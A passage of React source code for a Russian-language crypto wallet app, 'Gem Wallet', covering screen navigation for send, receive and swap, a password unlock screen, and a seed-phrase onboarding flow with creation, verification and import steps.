            />
          </div>
        )}

        {screen.name === "wallet-create-onboarding" && (
          <div className="anim-page" style={{ background: DS.bg, minHeight: "100vh" }}>
            {/* We can re-use the onboarding components or just a simplified version */}
            <OnboardingFlow mode="create" onBack={() => go({ name: "wallet-add" })} />
          </div>
        )}

        {screen.name === "wallet-import-onboarding" && (
          <div className="anim-page" style={{ background: DS.bg, minHeight: "100vh" }}>
            <OnboardingFlow mode="import" onBack={() => go({ name: "wallet-add" })} />
          </div>
        )}

        {screen.name === "home" && activeTab === "admin" && isAdmin && (
          <div className="anim-page">
            <AdminScreen onBack={() => setActiveTab("wallet")} />
          </div>
        )}

        {screen.name === "admin" && (
          <div className="anim-page">
            <AdminScreen onBack={() => go({ name: "home" })} />
          </div>
        )}

        {screen.name === "asset-detail" && (
          <div className="anim-page">
          <AssetDetailScreen
            assetId={screen.assetId}
            onBack={() => go({ name: "home" })}
            onSend={() => go({ name: "send-recipient", assetId: screen.assetId, backTo: "asset-detail" })}
            onReceive={() => go({ name: "receive-qr", assetId: screen.assetId, backTo: "asset-detail" })}
            onBuy={() => setShowComingSoon(true)}
            onSwap={() => { setSwapPayId(screen.assetId); setSwapReceiveId(null); go({ name: "swap" }); }}
          />
          </div>
        )}

        {screen.name === "send-select" && (
          <div className="anim-page">
          <SendSelectScreen
            onBack={() => go({ name: "home" })}
            onSelect={(id) => go({ name: "send-recipient", assetId: id })}
          />
          </div>
        )}

        {screen.name === "send-recipient" && (
          <div className="anim-page">
          <SendRecipientScreen
            assetId={screen.assetId}
            onBack={() => go(screen.backTo === "asset-detail" ? { name: "asset-detail", assetId: screen.assetId } : { name: "send-select" })}
            onContinue={(recipient) => go({ name: "send-amount", assetId: screen.assetId, recipient })}
          />
          </div>
        )}

        {screen.name === "send-amount" && (
          <div className="anim-page">
          <SendAmountScreen
            assetId={screen.assetId}
            recipient={screen.recipient}
            onBack={() => go({ name: "send-recipient", assetId: screen.assetId })}
            onContinue={(amount) => go({ name: "send-fee", assetId: screen.assetId, recipient: screen.recipient, amount })}
          />
          </div>
        )}

        {screen.name === "send-fee" && (
          <div className="anim-page">
          <SendFeeScreen
            assetId={screen.assetId}
            onBack={() => go({ name: "send-amount", assetId: screen.assetId, recipient: screen.recipient })}
            onContinue={(feeInfo) => go({ name: "send-confirm", assetId: screen.assetId, recipient: screen.recipient, amount: screen.amount, feeInfo })}
          />
          </div>
        )}

        {screen.name === "send-confirm" && (
          <div className="anim-page">
          <SendConfirmScreen
            assetId={screen.assetId}
            recipient={screen.recipient}
            amount={screen.amount}
            feeInfo={screen.feeInfo}
            onBack={() => go({ name: "send-fee", assetId: screen.assetId, recipient: screen.recipient, amount: screen.amount })}
            onConfirm={() => go({ name: "home" })}
          />
          </div>
        )}

        {screen.name === "receive-select" && (
          <div className="anim-page">
          <ReceiveSelectScreen
            onBack={() => go({ name: "home" })}
            onSelect={(id) => go({ name: "receive-qr", assetId: id })}
          />
          </div>
        )}

        {screen.name === "receive-qr" && (
          <div className="anim-page">
          <ReceiveQRScreen
            assetId={screen.assetId}
            onBack={() => go(screen.backTo === "asset-detail" ? { name: "asset-detail", assetId: screen.assetId } : { name: screen.backTo || "receive-select" })}
          />
          </div>
        )}

        {screen.name === "receive-nft-select" && (
          <div className="anim-page">
          <ReceiveNFTSelectScreen
            onBack={() => { setActiveTab("collections"); go({ name: "home" }); }}
            onSelect={(assetId) => go({ name: "receive-qr", assetId, backTo: "receive-nft-select" })}
          />
          </div>
        )}

        {screen.name === "swap" && (
          <div className="anim-page">
          <SwapScreen
            payId={swapPayId}
            receiveId={swapReceiveId}
            onBack={() => go({ name: "home" })}
            onSelectPay={() => go({ name: "swap-select-pay" })}
            onSelectReceive={() => go({ name: "swap-select-receive", payAssetId: swapPayId ?? "" })}
            onSwap={(amt) => go({ name: "swap-confirm", payAssetId: swapPayId, receiveAssetId: swapReceiveId, payAmount: amt })}
          />
          </div>
        )}

        {screen.name === "swap-select-pay" && (
          <div className="anim-page">
          <SwapAssetSelectScreen
            title="Вы платите"
            assets={swapPayAssets}
            recentIds={["ton", "eth"]}
            onBack={() => go({ name: "swap" })}
            onSelect={(id) => { setSwapPayId(id); go({ name: "swap" }); }}
          />
          </div>
        )}

        {screen.name === "swap-select-receive" && (
          <div className="anim-page">
          <SwapAssetSelectScreen
            title="Вы получаете"
            assets={swapReceiveAssets}
            onBack={() => go({ name: "swap" })}
            onSelect={(id) => { setSwapReceiveId(id); go({ name: "swap" }); }}
          />
          </div>
        )}

        {screen.name === "swap-confirm" && (
          <div className="anim-page">
          <SwapConfirmScreen
            payId={screen.payAssetId}
            receiveId={screen.receiveAssetId}
            payAmount={screen.payAmount}
            onBack={() => go({ name: "swap" })}
            onConfirm={() => go({ name: "home" })}
          />
          </div>
        )}

        {/* Persistent fixed bottom nav — always visible on home tabs */}
        {isHome && (
          <div style={{ position: "fixed", bottom: 0, left: "50%", transform: "translateX(-50%)",
            width: "100%", maxWidth: 420, zIndex: 100 }}>
            <BottomNav activeTab={activeTab} setActiveTab={setActiveTab} />
          </div>
        )}

      </div>
    </div>
  );
}


/* ─── Unlock screen ──────────────────────────────────────────── */
function UnlockScreen() {
  const { unlock, loading } = useWallet();
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handle = async () => {
    setError('');
    try { await unlock(password); }
    catch { setError('Неверный пароль'); }
  };

  return (
    <div style={{ background: DS.bg, minHeight: "100vh", display: "flex", justifyContent: "center", fontFamily: DS.font }}>
      <AnimStyles />
      <div style={{ width: "100%", maxWidth: 420, minHeight: "100vh", display: "flex", flexDirection: "column",
        alignItems: "center", justifyContent: "center", padding: "0 24px", boxSizing: "border-box" }}>

        {/* Logo */}
        <div style={{ marginBottom: 32, animation: "scaleIn 0.4s cubic-bezier(.22,.68,0,1.2) both" }}>
          <div style={{ width: 88, height: 88, borderRadius: 22, overflow: "hidden",
            boxShadow: "0 0 48px #3B7DFF66" }}>
            <img src={gemIcon} alt="Gem Wallet" style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }} />
          </div>
        </div>

        <div style={{ color: DS.text, fontWeight: 700, fontSize: 26, marginBottom: 6,
          animation: "fadeSlideUp 0.32s 0.05s cubic-bezier(.22,.68,0,1.2) both" }}>
          Gem Wallet
        </div>
        <div style={{ color: DS.muted, fontSize: 15, marginBottom: 40,
          animation: "fadeSlideUp 0.32s 0.10s cubic-bezier(.22,.68,0,1.2) both" }}>
          Введите пароль для входа
        </div>

        {/* Input */}
        <div style={{ width: "100%", animation: "fadeSlideUp 0.32s 0.15s cubic-bezier(.22,.68,0,1.2) both" }}>
          <div style={{ background: DS.card, borderRadius: 16, padding: "16px 18px",
            border: `1px solid ${error ? DS.danger : DS.border}`,
            display: "flex", alignItems: "center", gap: 12, marginBottom: 8 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20, flexShrink: 0 }}>
              <rect x="5" y="11" width="14" height="10" rx="2" stroke="#555" strokeWidth="1.8" />
              <path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="#555" strokeWidth="1.8" strokeLinecap="round" />
            </svg>
            <input
              type="password"
              placeholder="Пароль"
              value={password}
              onChange={e => setPassword(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && handle()}
              style={{ flex: 1, background: "none", border: "none", outline: "none",
                color: DS.text, fontSize: 16, fontFamily: DS.font }}
            />
          </div>
          {error && (
            <div style={{ color: DS.danger, fontSize: 13, marginBottom: 8, paddingLeft: 4 }}>
              {error}
            </div>
          )}
        </div>

        {/* Button */}
        <button
          onClick={handle}
          disabled={loading}
          style={{ width: "100%", padding: "17px 0", borderRadius: 14, border: "none",
            background: DS.blue, color: DS.text, fontSize: 16, fontWeight: 600,
            cursor: loading ? "not-allowed" : "pointer", opacity: loading ? 0.7 : 1,
            fontFamily: DS.font, transition: "opacity 0.2s",
            animation: "fadeSlideUp 0.32s 0.20s cubic-bezier(.22,.68,0,1.2) both" }}>
          {loading ? "Загрузка…" : "Войти"}
        </button>
      </div>
    </div>
  );
}

/* ─── Onboarding sub-components — defined OUTSIDE to prevent remount on re-render ─── */
function ORoot({ children }) {
  return (
    <div style={{ background: DS.bg, minHeight: "100vh", display: "flex", justifyContent: "center", fontFamily: DS.font }}>
      <AnimStyles />
      <div style={{ width: "100%", maxWidth: 420, minHeight: "100vh", display: "flex",
        flexDirection: "column", padding: "0 20px 32px", boxSizing: "border-box" }}>
        {children}
      </div>
    </div>
  );
}

function OBackBtn({ onClick }) {
  return (
    <button onClick={onClick}
      style={{ background: "none", border: "none", cursor: "pointer", padding: "16px 4px 8px",
        display: "flex", alignItems: "center", gap: 6, color: DS.blueS, fontSize: 15, fontFamily: DS.font }}>
      <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
        <path d="M15 19l-7-7 7-7" stroke={DS.blueS} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
      </svg>
      Назад
    </button>
  );
}

function OInputRow({ type = "text", placeholder, value, onChange, multiline }) {
  if (multiline) {
    return (
      <textarea placeholder={placeholder} value={value} onChange={e => onChange(e.target.value)} rows={4}
        style={{ width: "100%", background: DS.card, border: `1px solid ${DS.border}`,
          borderRadius: 14, padding: "14px 16px", color: DS.text, fontSize: 15,
          outline: "none", resize: "none", fontFamily: DS.font, lineHeight: 1.6, boxSizing: "border-box", marginBottom: 10 }} />
    );
  }
  return (
    <div style={{ background: DS.card, borderRadius: 14, padding: "14px 16px",
      border: `1px solid ${DS.border}`, display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
      <input type={type} placeholder={placeholder} value={value} onChange={e => onChange(e.target.value)}
        style={{ flex: 1, background: "none", border: "none", outline: "none",
          color: DS.text, fontSize: 15, fontFamily: DS.font }} />
    </div>
  );
}

function OBtn({ onClick, disabled, children, secondary }) {
  return (
    <button onClick={onClick} disabled={disabled}
      style={{ width: "100%", padding: "16px 0", borderRadius: 14, border: secondary ? `1px solid ${DS.border}` : "none",
        background: secondary ? DS.card : DS.blue,
        color: DS.text, fontSize: 16, fontWeight: 600, cursor: disabled ? "not-allowed" : "pointer",
        opacity: disabled ? 0.7 : 1, fontFamily: DS.font, marginBottom: 10 }}>
      {children}
    </button>
  );
}

function OErr({ msg }) {
  if (!msg) return null;
  return <div style={{ color: DS.danger, fontSize: 13, marginBottom: 8, paddingLeft: 4 }}>{msg}</div>;
}

/* ─── Onboarding screen ──────────────────────────────────────── */
function OnboardingScreen() {
  const { importWallet, generateNewMnemonic } = useWallet();
  const [step, setStep] = useState('welcome');
  const [mnemonic, setMnemonic] = useState('');
  const [importPhrase, setImportPhrase] = useState('');
  const [password, setPassword] = useState('');
  const [password2, setPassword2] = useState('');
  const [error, setError] = useState('');
  const [confirmed, setConfirmed] = useState(false);
  const [termsChecked, setTermsChecked] = useState([false, false, false]);
  const [verifySlots, setVerifySlots] = useState([]);
  const [verifyPool, setVerifyPool] = useState([]);
  const [localLoading, setLocalLoading] = useState(false);

  const handleStartCreate = () => {
    setError('');
    setTermsChecked([false, false, false]);
    try {
      const m = generateNewMnemonic();
      setMnemonic(m);
      setStep('terms');
    } catch (e) {
      setError(e.message);
    }
  };

  const DECOY_WORDS = ['apple','stone','river','cloud','thunder','silver','dragon','forest','castle','bridge','garden','mirror','candle','shadow','winter','summer'];

  const prepareVerify = () => {
    const words = mnemonic.split(' ');
    const totalWords = words.length;
    const slots = words.map((word) => ({
      correctWord: word,
      hidden: true,
      placedId: null,
    }));
    const correctPoolItems = words.map((word, i) => ({
      id: i, word, placed: false,
    }));
    const usedDecoys = DECOY_WORDS.filter(d => !words.includes(d)).slice(0, 4);
    const decoyItems = usedDecoys.map((word, i) => ({
      id: totalWords + i, word, placed: false,
    }));
    const pool = [...correctPoolItems, ...decoyItems].sort(() => Math.random() - 0.5);
    setVerifySlots(slots);
    setVerifyPool(pool);
    setError('');
    setStep('verify');
  };

  const handlePoolTap = (item) => {
    if (item.placed) {
      const slotIdx = verifySlots.findIndex(s => s.hidden && s.placedId === item.id);
      if (slotIdx === -1) return;
      setVerifySlots(prev => prev.map((s, i) => i === slotIdx ? { ...s, placedId: null } : s));
      setVerifyPool(prev => prev.map(p => p.id === item.id ? { ...p, placed: false } : p));
    } else {
      const slotIdx = verifySlots.findIndex(s => s.hidden && s.placedId === null);
      if (slotIdx === -1) return;
      setVerifySlots(prev => prev.map((s, i) => i === slotIdx ? { ...s, placedId: item.id } : s));
      setVerifyPool(prev => prev.map(p => p.id === item.id ? { ...p, placed: true } : p));
    }
  };

  const handleVerify = () => {
    const allFilled = verifySlots.every(s => !s.hidden || s.placedId !== null);
    if (!allFilled) { setError('Заполните все пустые позиции'); return; }
    const isCorrect = verifySlots.every(s => {
      if (!s.hidden) return true;
      const poolItem = verifyPool.find(p => p.id === s.placedId);
      return poolItem && poolItem.word.toLowerCase() === s.correctWord.toLowerCase();
    });
    if (!isCorrect) {
      setError('Неверные слова. Проверьте фразу и попробуйте снова.');
      setVerifySlots(prev => prev.map(s => s.hidden ? { ...s, placedId: null } : s));
      setVerifyPool(prev => prev.map(p => ({ ...p, placed: false })));
      return;
    }
    setStep('create-password');
  };

  const handleFinishCreate = async () => {
    setError('');
    if (password.length < 6) { setError('Пароль минимум 6 символов'); return; }
    if (password !== password2) { setError('Пароли не совпадают'); return; }
    
    setLocalLoading(true);
    try {
      await importWallet(mnemonic, password);
      // Success is handled by the Root component as hasWallet/isUnlocked will change
    } catch (e) {
      setError(e.message);
      setLocalLoading(false);
    }
  };

  const handleImport = async () => {
    setError('');
    const words = importPhrase.trim().split(/\s+/);
    if (words.length !== 12 && words.length !== 24) { setError('Введите 12 или 24 слова'); return; }
    if (password.length < 6) { setError('Пароль минимум 6 символов'); return; }
    if (password !== password2) { setError('Пароли не совпадают'); return; }
    
    setLocalLoading(true);
    try { 
      await importWallet(importPhrase.trim(), password); 
    } catch (e) { 
      setError(e.message); 
      setLocalLoading(false);
    }
  };

  if (step === 'welcome') return (
    <div style={{ background: DS.bg, minHeight: "100vh", display: "flex", justifyContent: "center", fontFamily: DS.font, overflowX: "hidden" }}>
      <AnimStyles />
      <style>{`
        @keyframes floatGem { 0%,100%{transform:translateY(0px)} 50%{transform:translateY(-10px)} }
        @keyframes glowPulse { 0%,100%{opacity:0.5;transform:scale(1)} 50%{opacity:1;transform:scale(1.08)} }
        @keyframes shimmer { 0%{background-position:-200% center} 100%{background-position:200% center} }
        @keyframes dotPop { 0%{transform:scale(0);opacity:0} 60%{transform:scale(1.2)} 100%{transform:scale(1);opacity:1} }
      `}</style>
      <div style={{ width: "100%", maxWidth: 420, minHeight: "100vh", display: "flex",
        flexDirection: "column", padding: "0 24px 40px", boxSizing: "border-box", position: "relative" }}>

        {/* Background decorations */}
        <div style={{ position: "absolute", top: -80, left: -80, width: 280, height: 280,
          borderRadius: "50%", background: "radial-gradient(circle, rgba(59,125,255,0.12) 0%, transparent 70%)",
          pointerEvents: "none" }} />
        <div style={{ position: "absolute", bottom: 120, right: -60, width: 200, height: 200,
          borderRadius: "50%", background: "radial-gradient(circle, rgba(100,65,255,0.10) 0%, transparent 70%)",
          pointerEvents: "none" }} />

        {/* Logo area */}
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center",
          justifyContent: "center", paddingTop: 20 }}>

          {/* Glow ring */}
          <div style={{ position: "relative", animation: "floatGem 3.5s ease-in-out infinite" }}>
            <div style={{ position: "absolute", inset: -18, borderRadius: "50%",
              background: "radial-gradient(circle, rgba(59,125,255,0.35) 0%, transparent 70%)",
              animation: "glowPulse 3s ease-in-out infinite" }} />
            <div style={{ position: "absolute", inset: -8, borderRadius: 38,
              boxShadow: "0 0 0 1px rgba(59,125,255,0.25), 0 0 40px rgba(59,125,255,0.25)",
              borderRadius: 36 }} />
            <div style={{ width: 128, height: 128, borderRadius: 30, overflow: "hidden",
              boxShadow: "0 12px 48px rgba(59,125,255,0.55), 0 4px 16px rgba(0,0,0,0.4)",
              animation: "scaleIn 0.5s cubic-bezier(.22,.68,0,1.2) both", position: "relative", zIndex: 1 }}>
              <img src={gemIcon} alt="Gem Wallet" style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }} />
            </div>
          </div>

          {/* Title */}
          <div style={{ marginTop: 32, animation: "fadeSlideUp 0.35s 0.12s cubic-bezier(.22,.68,0,1.2) both",
            textAlign: "center" }}>
            <div style={{ fontSize: 34, fontWeight: 800, letterSpacing: -0.5, lineHeight: 1.1,
              background: "linear-gradient(135deg, #fff 0%, rgba(255,255,255,0.85) 100%)",
              WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent", backgroundClip: "text" }}>
              Gem Wallet
            </div>
            <div style={{ color: "#8E8E93", fontSize: 16, marginTop: 8, lineHeight: 1.5, fontWeight: 400 }}>
              Ваш надёжный крипто-кошелёк
            </div>
          </div>

          {/* Feature highlights */}
          <div style={{ display: "flex", flexDirection: "column", gap: 12, width: "100%",
            marginTop: 40, animation: "fadeSlideUp 0.35s 0.22s cubic-bezier(.22,.68,0,1.2) both" }}>
            {[
              { icon: "🔐", title: "Полная безопасность", desc: "Ключи хранятся только на вашем устройстве" },
              { icon: "⚡", title: "Мгновенные переводы", desc: "TON, ETH, BTC, SOL и другие сети" },
              { icon: "💎", title: "Только ваши монеты", desc: "Никаких посредников, полный контроль" },
            ].map((f, i) => (
              <div key={i} style={{ display: "flex", alignItems: "center", gap: 14,
                background: "rgba(255,255,255,0.04)", borderRadius: 16,
                border: "1px solid rgba(255,255,255,0.07)", padding: "14px 16px",
                animation: `dotPop 0.4s ${0.28 + i * 0.08}s cubic-bezier(.22,.68,0,1.2) both` }}>
                <div style={{ width: 44, height: 44, borderRadius: 12, flexShrink: 0,
                  background: "rgba(59,125,255,0.12)", border: "1px solid rgba(59,125,255,0.2)",
                  display: "flex", alignItems: "center", justifyContent: "center", fontSize: 22 }}>
                  {f.icon}
                </div>
                <div>
                  <div style={{ color: "#fff", fontWeight: 600, fontSize: 15, lineHeight: 1.2 }}>{f.title}</div>
                  <div style={{ color: "#8E8E93", fontSize: 13, marginTop: 2, lineHeight: 1.4 }}>{f.desc}</div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Buttons */}
        <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 32,
          animation: "fadeSlideUp 0.35s 0.52s cubic-bezier(.22,.68,0,1.2) both" }}>
          <button onClick={handleStartCreate} disabled={localLoading}
            style={{ width: "100%", padding: "17px 0", borderRadius: 16, border: "none",
              background: localLoading ? "#2A4A9A" : "linear-gradient(135deg, #4F8FFF 0%, #1A55E3 100%)",
              color: "#fff", fontSize: 17, fontWeight: 700, cursor: localLoading ? "not-allowed" : "pointer",
              fontFamily: DS.font, letterSpacing: 0.1,
              boxShadow: localLoading ? "none" : "0 4px 24px rgba(59,125,255,0.45)", transition: "all 0.2s" }}>
            {localLoading ? "Создание…" : "Создать новый кошелёк"}
          </button>
          <button onClick={() => { setStep('import'); setError(''); setPassword(''); setPassword2(''); setImportPhrase(''); }}
            style={{ width: "100%", padding: "17px 0", borderRadius: 16,
              border: "1px solid rgba(255,255,255,0.12)", background: "rgba(255,255,255,0.05)",
              color: "#fff", fontSize: 17, fontWeight: 600, cursor: "pointer",
              fontFamily: DS.font, transition: "all 0.2s" }}>
            У меня уже есть кошелёк
          </button>
          <div style={{ textAlign: "center", color: "#555", fontSize: 12, marginTop: 4, lineHeight: 1.5 }}>
            Продолжая, вы принимаете условия использования
          </div>
        </div>
      </div>
    </div>
  );

  if (step === 'create-password') return (
    <ORoot>
      <OBackBtn onClick={() => setStep('verify')} />
      <div style={{ color: DS.text, fontWeight: 700, fontSize: 24, marginBottom: 8, marginTop: 16 }}>Создать пароль</div>
      <div style={{ color: DS.muted, fontSize: 15, marginBottom: 32, lineHeight: 1.5 }}>
        Придумайте надёжный пароль для шифрования ключей
      </div>
      <OInputRow type="password" placeholder="Пароль (минимум 6 символов)" value={password} onChange={setPassword} />
      <OInputRow type="password" placeholder="Повторите пароль" value={password2} onChange={setPassword2} />
      <div style={{ flex: 1 }} />
      <OErr msg={error} />
      <OBtn onClick={handleFinishCreate} disabled={localLoading}>{localLoading ? "Завершение…" : "Создать кошелек"}</OBtn>
    </ORoot>
  );

  if (step === 'terms') {
    const TERMS = [
      "Я понимаю, что ответственность за безопасность и резервное копирование моих кошельков несу исключительно я, а не Gem.",
      "Я понимаю, что Gem не является банком или биржей, и использование его в незаконных целях строго запрещено.",
      "Я понимаю, что если я потеряю доступ к своим кошелькам, Gem не несет ответственности и не сможет оказать никакой помощи.",
    ];
    const allAccepted = termsChecked.every(Boolean);
    return (
      <ORoot>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", paddingTop: 16, marginBottom: 8 }}>
          <button onClick={() => setStep('welcome')} style={{ background: DS.card, border: `1px solid ${DS.border}`, borderRadius: "50%", width: 36, height: 36, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18 }}><path d="M18 6L6 18M6 6l12 12" stroke="white" strokeWidth="2.5" strokeLinecap="round" /></svg>
          </button>
          <span style={{ color: DS.text, fontWeight: 700, fontSize: 17 }}>Принять условия</span>
          <div style={{ width: 36 }} />
        </div>
        <div style={{ color: DS.muted, fontSize: 14, textAlign: "center", marginBottom: 24, lineHeight: 1.6 }}>
          Прежде чем продолжить, пожалуйста,<br />прочтите и примите следующие условия.
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 12, flex: 1 }}>
          {TERMS.map((text, i) => (
            <div key={i} onClick={() => { const c = [...termsChecked]; c[i] = !c[i]; setTermsChecked(c); }}
              style={{ display: "flex", alignItems: "flex-start", gap: 14, background: DS.card, borderRadius: 16,
                padding: "16px", border: `1px solid ${termsChecked[i] ? DS.blue : DS.border}`, cursor: "pointer",
                transition: "border-color 0.2s" }}>
              <div style={{ width: 22, height: 22, borderRadius: "50%", border: `2px solid ${termsChecked[i] ? DS.blue : "#555"}`,
                background: termsChecked[i] ? DS.blue : "transparent", flexShrink: 0, marginTop: 1,
                display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.2s" }}>
                {termsChecked[i] && <svg viewBox="0 0 24 24" fill="none" style={{ width: 13, height: 13 }}>
                  <path d="M5 13l4 4L19 7" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                </svg>}
              </div>
              <span style={{ color: DS.text, fontSize: 14, lineHeight: 1.6 }}>{text}</span>
            </div>
          ))}
        </div>
        <div style={{ marginTop: 32 }}>
          <OBtn onClick={() => setStep('new-wallet-info')} disabled={!allAccepted}>Согласиться и продолжить</OBtn>
        </div>
      </ORoot>
    );
  }

  if (step === 'new-wallet-info') {
    const INFO = [
      { icon: "🔒", title: "Храните в безопасном месте", sub: "Секретная фраза – это единственный способ получить доступ к своему кошельку." },
      { icon: "⚠️", title: "Не делитесь этим ни с кем", sub: "Любой, кто узнает вашу секретную фразу, может получить полный контроль над вашим кошельком." },
      { icon: "💎", title: "Мы не можем помочь вам восстановить его.", sub: "Если вы потеряете секретную фразу, вы потеряете доступ к своему кошельку." },
    ];
    return (
      <ORoot>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", paddingTop: 16, marginBottom: 8 }}>
          <button onClick={() => setStep('terms')} style={{ background: DS.card, border: `1px solid ${DS.border}`, borderRadius: "50%", width: 36, height: 36, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18 }}><path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
          </button>
          <span style={{ color: DS.text, fontWeight: 700, fontSize: 17 }}>Новый кошелек</span>
          <div style={{ width: 36 }} />
        </div>
        <div style={{ color: DS.muted, fontSize: 14, textAlign: "center", marginBottom: 24, lineHeight: 1.6 }}>
          Вы получите Секретную фразу — это единственный способ получить доступ к вашему кошельку.
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 12, flex: 1 }}>
          {INFO.map((item, i) => (
            <div key={i} style={{ display: "flex", alignItems: "flex-start", gap: 14, background: DS.card,
              borderRadius: 16, padding: "16px", border: `1px solid ${DS.border}` }}>
              <span style={{ fontSize: 22, flexShrink: 0, marginTop: 1 }}>{item.icon}</span>
              <div>
                <div style={{ color: DS.text, fontWeight: 700, fontSize: 15, marginBottom: 4 }}>{item.title}</div>
                <div style={{ color: DS.muted, fontSize: 13, lineHeight: 1.6 }}>{item.sub}</div>
              </div>
            </div>
          ))}
        </div>
        <div style={{ marginTop: 32 }}>
          <OBtn onClick={() => setStep('backup')}>Продолжить</OBtn>
        </div>
      </ORoot>
    );
  }

  if (step === 'backup') return (
    <ORoot>
      <div style={{ paddingTop: 24 }}>
        <div style={{ color: DS.text, fontWeight: 700, fontSize: 24, marginBottom: 8 }}>
          Ваша seed-фраза
        </div>
        <div style={{ background: "rgba(255,149,0,0.1)", border: "1px solid rgba(255,149,0,0.3)",
          borderRadius: 12, padding: "14px 16px", marginBottom: 20 }}>
          <span style={{ color: DS.warn, fontSize: 14, lineHeight: 1.5 }}>
            ⚠️ Запишите эти 12 слов и храните в безопасном месте. Без них восстановить кошелёк невозможно.
          </span>
        </div>
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 24 }}>
          {mnemonic.split(' ').map((word, i) => (
            <div key={i} style={{ background: DS.card, borderRadius: 10, padding: "8px 14px",
              border: `1px solid ${DS.border}`, display: "flex", gap: 8, alignItems: "center" }}>
              <span style={{ color: "#555", fontSize: 11, minWidth: 14, textAlign: "right" }}>{i + 1}</span>
              <span style={{ color: DS.text, fontSize: 14, fontWeight: 600 }}>{word}</span>
            </div>
          ))}
        </div>
        <div onClick={() => setConfirmed(c => !c)}
          style={{ display: "flex", alignItems: "center", gap: 12, padding: "14px 16px",
            background: DS.card, borderRadius: 14, border: `1px solid ${confirmed ? DS.blueS : DS.border}`,
            cursor: "pointer", marginBottom: 16 }}>
          <div style={{ width: 22, height: 22, borderRadius: 6, border: `2px solid ${confirmed ? DS.blueS : "#555"}`,
            background: confirmed ? DS.blueS : "transparent",
            display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, transition: "all 0.2s" }}>
            {confirmed && <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
              <path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
            </svg>}
          </div>
          <span style={{ color: DS.text, fontSize: 14 }}>Я записал seed-фразу в безопасное место</span>
        </div>
        <OBtn onClick={prepareVerify} disabled={!confirmed}>Готово — продолжить</OBtn>
      </div>
    </ORoot>
  );

  if (step === 'verify') return (
    <ORoot>
      <OBackBtn onClick={() => setStep('backup')} />
      <div style={{ color: DS.text, fontWeight: 700, fontSize: 22, marginBottom: 6, marginTop: 16 }}>Подтвердить</div>
      <div style={{ color: DS.muted, fontSize: 14, marginBottom: 20, lineHeight: 1.5 }}>
        Нажмите на слова в правильном порядке, чтобы заполнить пустые места
      </div>
      {/* 2-column word grid */}
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8, marginBottom: 20 }}>
        {verifySlots.map((slot, i) => {
          const leftCol = i < Math.ceil(verifySlots.length / 2);
          const colIdx = leftCol ? i : i - Math.ceil(verifySlots.length / 2);
          const displayIdx = leftCol ? i : colIdx + Math.ceil(verifySlots.length / 2);
          let displayWord = null;
          if (!slot.hidden) {
            displayWord = slot.correctWord;
          } else if (slot.placedId !== null) {
            const poolItem = verifyPool.find(p => p.id === slot.placedId);
            displayWord = poolItem ? poolItem.word : null;
          }
          const isEmpty = slot.hidden && slot.placedId === null;
          return (
            <div key={i} onClick={() => {
              if (slot.hidden && slot.placedId !== null) {
                const poolItem = verifyPool.find(p => p.id === slot.placedId);
                if (poolItem) handlePoolTap(poolItem);
              }
            }}
              style={{
                background: isEmpty ? "transparent" : DS.card,
                border: `1px solid ${isEmpty ? DS.border : slot.hidden ? DS.blue : DS.border}`,
                borderRadius: 10, padding: "10px 12px",
                display: "flex", alignItems: "center", gap: 8,
                cursor: slot.hidden && slot.placedId !== null ? "pointer" : "default",
                minHeight: 42,
              }}>
              <span style={{ color: DS.muted, fontSize: 12, minWidth: 18, fontWeight: 600 }}>{i + 1}.</span>
              {displayWord ? (
                <span style={{ color: slot.hidden ? DS.blue : DS.text, fontSize: 14, fontWeight: slot.hidden ? 600 : 500 }}>{displayWord}</span>
              ) : (
                <span style={{ color: DS.border, fontSize: 13 }}></span>
              )}
            </div>
          );
        })}
      </div>
      {/* Word pool */}
      <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 16, justifyContent: "center" }}>
        {verifyPool.map(item => (
          <div key={item.id} onClick={() => handlePoolTap(item)}
            style={{
              background: item.placed ? DS.blue : DS.card,
              border: `1px solid ${item.placed ? DS.blue : DS.border}`,
              borderRadius: 20, padding: "8px 16px", cursor: "pointer",
              transition: "all 0.15s",
            }}>
            <span style={{ color: DS.text, fontSize: 14, fontWeight: item.placed ? 600 : 400 }}>{item.word}</span>
          </div>
        ))}
      </div>
      <OErr msg={error} />
      <OBtn onClick={handleVerify}>Продолжить</OBtn>
    </ORoot>
  );

  if (step === 'import') return (
    <ORoot>
      <OBackBtn onClick={() => setStep('welcome')} />
      <div style={{ color: DS.text, fontWeight: 700, fontSize: 24, marginBottom: 8, marginTop: 16 }}>Импорт кошелька</div>
      <div style={{ color: DS.muted, fontSize: 15, marginBottom: 20, lineHeight: 1.5 }}>
        Введите 12 или 24 слова через пробел
      </div>
      <OInputRow multiline placeholder="word1 word2 word3 …" value={importPhrase} onChange={setImportPhrase} />
